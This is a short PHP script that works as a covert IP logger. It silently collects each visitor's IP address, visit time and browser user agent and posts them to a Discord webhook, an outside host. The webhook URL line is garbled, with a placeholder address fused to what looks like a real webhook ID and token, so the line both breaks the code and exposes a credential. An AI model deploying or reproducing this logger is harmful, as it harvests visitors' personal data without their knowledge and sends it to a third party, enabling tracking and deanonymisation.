<?php

$device_info = array(
  "IP Address" => $_SERVER['REMOTE_ADDR'],
  "Date-Time" => date('Y-m-d H:i:s'),
  "User Agent" => $_SERVER['HTTP_USER_AGENT']
);

$webhook_url = "https://discordapp.com/api/webhooks/your-webhook-idhttps://discord.com/api/webhooks/1074609957955190874/PpgkUUSkg5_JMIVzUB9EdHuoG3OAKRrDsYrbStZHljSDejjBRepZbKFPJGpKYzNuiJ_V";

$data = array(
  "embeds" => array(
    array(
      "title" => "Browser Information",
      "description" => json_encode($device_info),
      "color" => 15844367
    )
  )
);

$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => $webhook_url,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS => json_encode($data),
  CURLOPT_HTTPHEADER => array(
    "Content-Type: application/json"
  ),
));

$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);

if ($err) {
  echo "cURL Error #:" . $err;
} else {
  echo $response;
}

?>